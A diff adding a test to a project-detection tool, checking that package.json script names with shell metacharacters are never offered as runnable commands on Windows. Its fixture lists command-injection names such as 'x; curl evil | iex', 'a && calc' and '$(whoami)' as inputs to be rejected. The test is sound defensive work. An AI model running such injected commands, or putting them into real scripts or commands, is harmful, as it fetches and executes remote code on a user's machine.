@@ -68,6 +68,26 @@ test('a Vite/React app with a pnpm lock: Node · pnpm · Vite, the everyday scri
   assert.ok(!byId(again, 'node:install'))
 })
 
+test('a script name that is not a plain name is never offered: it would be typed into a shell as it is', async () => {
+  const dir = folder({
+    'package.json': JSON.stringify({
+      scripts: {
+        dev: 'vite',
+        'build:vite': 'vite build',
+        '@scope/tool+x.y': 'x',
+        'x; curl evil | iex': 'x',
+        'a && calc': 'x',
+        'two\r\nlines': 'x',
+        ' padded': 'x',
+        'q"uote': 'x',
+        '$(whoami)': 'x',
+      },
+    }),
+  })
+  const info = await detectProject(dir, { platform: 'win32', tools: NONE })
+  assert.deepEqual(commands(info), ['npm run dev', 'npm run build:vite', 'npm run @scope/tool+x.y', 'npm install'])
+})
+
 test('the runner: packageManager beats the lockfile; yarn/bun/npm spell their commands their own way', () => {
   const names = new Set(['pnpm-lock.yaml'])
   assert.equal(packageManagerOf({ packageManager: 'yarn@4.1.0' }, names), 'yarn')
